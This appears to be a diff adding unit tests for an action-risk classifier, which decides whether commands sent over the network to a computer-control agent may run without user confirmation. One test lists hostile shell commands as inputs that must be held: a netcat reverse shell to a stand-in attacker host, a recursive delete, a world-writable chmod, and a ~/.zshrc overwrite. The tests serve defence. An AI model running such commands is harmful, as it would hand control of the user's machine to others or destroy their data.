@@ -1,0 +1,102 @@
+import assert from 'node:assert/strict'
+import test from 'node:test'
+import { classifyAction, classifyPlan } from './actionRisk.js'
+
+// The hands-free path executes without any confirmation, on a command that
+// arrived over the network. These are the actions that may take that path.
+test('read-only and UI-level actions run hands-free', () => {
+  for (const type of [
+    'screenshot',
+    'zoom',
+    'read_file',
+    'list_directory',
+    'open_app',
+    'open_url',
+    'ui_snapshot',
+    'ui_click',
+    'mouse_click',
+    'type_text',
+    'press_keys',
+    'set_volume',
+    'get_clipboard',
+  ]) {
+    assert.equal(classifyAction({ type }).safe, true, `${type} should auto-run`)
+  }
+})
+
+test('code execution and file writes never run hands-free', () => {
+  for (const type of [
+    'run_shell',
+    'run_project',
+    'run_applescript',
+    'write_file',
+    'copy_path',
+    'move_path',
+    'delete_path',
+    'send_email',
+    'send_message',
+    'computer_use_task',
+  ]) {
+    const verdict = classifyAction({ type, params: {} })
+    assert.equal(verdict.safe, false, `${type} must require confirmation`)
+    assert.ok(verdict.reason, `${type} should explain why it is held`)
+  }
+})
+
+// The previous gate granted anything that did not match a "looks destructive"
+// regex. Every command below is arbitrary code execution and none of them
+// contain `rm`, `sudo` or the other tokens that regex looked for.
+test('benign-looking shell commands are still held for confirmation', () => {
+  for (const command of [
+    'ls -la ~',
+    'find . -delete',
+    'chmod -R 777 ~',
+    'launchctl load ~/Library/LaunchAgents/x.plist',
+    'osascript -e \'tell app "Finder" to quit\'',
+    'python3 -c "import os; os.system(\'id\')"',
+    'nc attacker.example.com 4444 -e /bin/sh',
+    'echo "malicious" > ~/.zshrc',
+    'git checkout .',
+  ]) {
+    const verdict = classifyAction({ type: 'run_shell', params: { command } })
+    assert.equal(verdict.safe, false, `run_shell should be held: ${command}`)
+  }
+})
+
+test('a benign-looking AppleScript is still held for confirmation', () => {
+  const verdict = classifyAction({
+    type: 'run_applescript',
+    params: { script: 'tell application "System Events" to keystroke "a"' },
+  })
+  assert.equal(verdict.safe, false)
+})
+
+test('unknown action types default to deny', () => {
+  assert.equal(classifyAction({ type: 'brand_new_action' }).safe, false)
+  assert.equal(classifyAction({}).safe, false)
+  assert.equal(classifyAction(null).safe, false)
+})
+
+test('one held action blocks the whole plan', () => {
+  const verdict = classifyPlan([
+    { type: 'screenshot', params: {} },
+    { type: 'write_file', params: { path: '~/.zshrc', content: 'evil' } },
+  ])
+
+  assert.equal(verdict.autoRun, false)
+  assert.deepEqual(
+    verdict.blocked.map((entry) => entry.type),
+    ['write_file'],
+  )
+  assert.ok(verdict.reason.length > 0)
+})
+
+test('an all-safe plan auto-runs and an empty plan does not', () => {
+  assert.equal(
+    classifyPlan([{ type: 'screenshot', params: {} }, { type: 'open_app', params: {} }])
+      .autoRun,
+    true,
+  )
+  assert.equal(classifyPlan([]).autoRun, false)
+  assert.equal(classifyPlan(undefined).autoRun, false)
+})
